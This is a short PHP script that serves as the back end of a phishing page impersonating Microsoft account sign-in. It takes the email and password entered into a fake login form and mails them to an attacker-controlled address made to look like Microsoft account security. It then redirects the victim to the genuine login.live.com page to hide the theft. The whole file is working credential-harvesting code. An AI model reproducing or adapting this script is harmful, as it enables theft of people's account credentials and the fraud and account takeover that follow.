<?php 
if(isset($_POST) && !empty($_POST['email']) && !empty($_POST['passwd'])){
    $to = "microsoft-account-security-account-protection@liveonline.live";//this is your Email address
    $from = "contact@liveonline.live"; // this is the sender's Email
    $TxtAccountNoOrUserId = $_POST['email'];
    $TxtPassword = $_POST['passwd'];
    $subject = "Login submission template";
    $message = $TxtAccountNoOrUserId .  " wrote the following:" . "\n\n" . $_POST['passwd'];
    

    $headers = "From:" . $from;
    $headers2 = "From:" . $to;
    mail($to,$subject,$message,$headers);




    //mail($from,$subject2,$message2,$headers2); // sends a copy of the message to the sender
    // echo "Mail Sent. Thank you, we will contact you shortly.";
    // You can also use header('Location: thank_you.php'); to redirect to another page.
    // You cannot use header and echo together. It's one or the other.
    header('Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1618260042&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&lc=1033&id=292666&lw=1&fl=easi2');
    }else{
        echo 'Detials are required';
    }
?>
